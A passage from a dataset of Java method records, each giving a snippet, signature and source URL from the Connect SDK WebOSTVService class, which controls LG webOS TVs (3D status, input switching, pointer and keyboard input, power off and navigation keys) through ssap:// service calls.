get3DEnabled(boolean isSubscription, final State3DModeListener listener) {\n        String uri = \"ssap://com.webos.service.tv.display/get3DStatus\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                JSONObject jsonObj = (JSONObject)response;\n\n                JSONObject status;\n                try {\n                    status = jsonObj.getJSONObject(\"status3D\");\n                    boolean isEnabled = status.getBoolean(\"status\");\n\n                    Util.postSuccess(listener, isEnabled);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<State3DModeListener> request;\n        if (isSubscription)\n            request = new URLServiceSubscription<State3DModeListener>(this, uri, null, true, responseListener);\n        else \n            request = new ServiceCommand<State3DModeListener>(this, uri, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34719, "method_name": "get3DEnabled", "class_name": "WebOSTVService", "params": ["State3DModeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void get3DEnabled(final State3DModeListener listener) {\n        get3DEnabled(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34720, "method_name": "subscribe3DEnabled", "class_name": "WebOSTVService", "params": ["State3DModeListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<State3DModeListener>", "snippet": "    public ServiceSubscription<State3DModeListener> subscribe3DEnabled(final State3DModeListener listener) {\n        return (ServiceSubscription<State3DModeListener>) get3DEnabled(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34721, "method_name": "getExternalInput", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExternalInputControl", "snippet": "    public ExternalInputControl getExternalInput() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34722, "method_name": "getExternalInputControlPriorityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getExternalInputControlPriorityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34723, "method_name": "launchInputPicker", "class_name": "WebOSTVService", "params": ["AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchInputPicker(final AppLaunchListener listener) {\n        final AppInfo appInfo = new AppInfo() {{\n            setId(\"com.webos.app.inputpicker\");\n            setName(\"InputPicker\");\n        }};\n\n        launchAppWithInfo(appInfo, null, new AppLaunchListener() {\n            @Override\n            public void onSuccess(LaunchSession object) {\n                listener.onSuccess(object);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                appInfo.setId(\"com.webos.app.inputmgr\");\n                launchAppWithInfo(appInfo, null, listener);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34724, "method_name": "closeInputPicker", "class_name": "WebOSTVService", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeInputPicker(LaunchSession launchSession, ResponseListener<Object> listener) {\n        closeApp(launchSession, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34725, "method_name": "getExternalInputList", "class_name": "WebOSTVService", "params": ["ExternalInputListListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getExternalInputList(final ExternalInputListListener listener) {\n        String uri = \"ssap://tv/getExternalInputList\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    JSONArray devices = (JSONArray) jsonObj.get(\"devices\");\n                    Util.postSuccess(listener, externalnputInfoFromJSONArray(devices));\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34726, "method_name": "setExternalInput", "class_name": "WebOSTVService", "params": ["ExternalInputInfo", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExternalInput(ExternalInputInfo externalInputInfo , final ResponseListener<Object> listener) {\n        String uri = \"ssap://tv/switchInput\";\n\n        JSONObject payload = new JSONObject();\n\n        try {\n            if (externalInputInfo  != null && externalInputInfo .getId() != null) {\n                payload.put(\"inputId\", externalInputInfo.getId());\n            }\n            else {\n                Log.w(Util.T, \"ExternalInputInfo has no id\");\n            }\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34727, "method_name": "getMouseControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MouseControl", "snippet": "    public MouseControl getMouseControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34728, "method_name": "getMouseControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMouseControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34729, "method_name": "connectMouse", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connectMouse() {\n        connectMouse(new WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener() {\n            @Override\n            public void onConnected() {\n                // intentionally left empty\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34730, "method_name": "disconnectMouse", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnectMouse() {\n        if (mouseSocket == null)\n            return;\n\n        mouseSocket.disconnect();\n        mouseSocket = null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34731, "method_name": "connectMouse", "class_name": "WebOSTVService", "params": ["WebOSTVMouseSocketConnection"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void connectMouse(final WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener successHandler) {\n        if (mouseSocket != null)\n            return;\n\n        String uri = \"ssap://com.webos.service.networkinput/getPointerInputSocket\";\n\n        ResponseListener<Object> listener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    String socketPath = (String) jsonObj.get(\"socketPath\");\n                    mouseSocket = new WebOSTVMouseSocketConnection(socketPath, successHandler);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Log.w(Util.T, \"Connect mouse error: \" + error.getMessage());\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34732, "method_name": "click", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void click() {\n        if (mouseSocket != null) {\n            mouseSocket.click();\n        }\n        else {\n            connectMouse(new WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener() {\n                @Override\n                public void onConnected() {\n                    mouseSocket.click();\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34733, "method_name": "move", "class_name": "WebOSTVService", "params": ["double", "double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void move(final double dx, final double dy) {\n        if (mouseSocket != null) {\n            mouseSocket.move(dx, dy);\n        }\n        else {\n            connectMouse(new WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener() {\n                @Override\n                public void onConnected() {\n                    mouseSocket.move(dx, dy);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34734, "method_name": "move", "class_name": "WebOSTVService", "params": ["PointF"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void move(PointF diff) {\n        move(diff.x, diff.y);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34735, "method_name": "scroll", "class_name": "WebOSTVService", "params": ["double", "double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void scroll(final double dx, final double dy) {\n        if (mouseSocket != null) {\n            mouseSocket.scroll(dx, dy);\n        }\n        else {\n            connectMouse(new WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener() {\n                @Override\n                public void onConnected() {\n                    mouseSocket.scroll(dx, dy);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34736, "method_name": "scroll", "class_name": "WebOSTVService", "params": ["PointF"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void scroll(PointF diff) {\n        scroll(diff.x, diff.y);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34737, "method_name": "getTextInputControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TextInputControl", "snippet": "    public TextInputControl getTextInputControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34738, "method_name": "getTextInputControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getTextInputControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34739, "method_name": "subscribeTextInputStatus", "class_name": "WebOSTVService", "params": ["TextInputStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<TextInputStatusListener>", "snippet": "    public ServiceSubscription<TextInputStatusListener> subscribeTextInputStatus(TextInputStatusListener listener) {\n        keyboardInput = new WebOSTVKeyboardInput(this);\n        return keyboardInput.connect(listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34740, "method_name": "sendText", "class_name": "WebOSTVService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendText(String input) {\n        if (keyboardInput != null) {\n            keyboardInput.addToQueue(input);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34741, "method_name": "sendKeyCode", "class_name": "WebOSTVService", "params": ["KeyCode", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendKeyCode(KeyCode keycode, ResponseListener<Object> listener) {\n        switch (keycode) {\n            case NUM_0:\n            case NUM_1:\n            case NUM_2:\n            case NUM_3:\n            case NUM_4:\n            case NUM_5:\n            case NUM_6:\n            case NUM_7:\n            case NUM_8:\n            case NUM_9:\n                sendSpecialKey(String.valueOf(keycode.getCode()), listener);\n                break;\n            case DASH:\n                sendSpecialKey(\"DASH\", listener);\n                break;\n            case ENTER:\n                sendSpecialKey(\"ENTER\", listener);\n            default:\n                Util.postError(listener, new ServiceCommandError(0, \"The keycode is not available\", null));\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34742, "method_name": "sendEnter", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendEnter() {\n        if (keyboardInput != null) {\n            keyboardInput.sendEnter();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34743, "method_name": "sendDelete", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendDelete() {\n        if (keyboardInput != null) {\n            keyboardInput.sendDel();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34744, "method_name": "getPowerControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PowerControl", "snippet": "    public PowerControl getPowerControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34745, "method_name": "getPowerControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getPowerControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34746, "method_name": "powerOff", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void powerOff(ResponseListener<Object> listener) {\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n\n            }\n        };\n\n        String uri = \"ssap://system/turnOff\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34747, "method_name": "powerOn", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void powerOn(ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34748, "method_name": "getKeyControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "KeyControl", "snippet": "    public KeyControl getKeyControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34749, "method_name": "getKeyControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getKeyControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34750, "method_name": "sendSpecialKey", "class_name": "WebOSTVService", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sendSpecialKey(final String key, final ResponseListener<Object> listener) {\n        if (mouseSocket != null) {\n            mouseSocket.button(key);\n            Util.postSuccess(listener, null);\n        }\n        else {\n            connectMouse(new WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener() {\n                @Override\n                public void onConnected() {\n                    mouseSocket.button(key);\n                    Util.postSuccess(listener, null);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34751, "method_name": "up", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void up(ResponseListener<Object> listener) {\n        sendSpecialKey(\"UP\", listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34752, "method_name": "down", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void down(ResponseListener<Object> listener) {\n        sendSpecialKey(\"DOWN\", listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34753, "method_name": "left", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void left(ResponseListener<Object> listener) {\n        sendSpecialKey(\"LEFT\", listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34754, "method_name": "right", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void right(ResponseListener<Object> listener) {\n        sendSpecialKey(\"RIGHT\", listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34755, "method_name": "ok", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 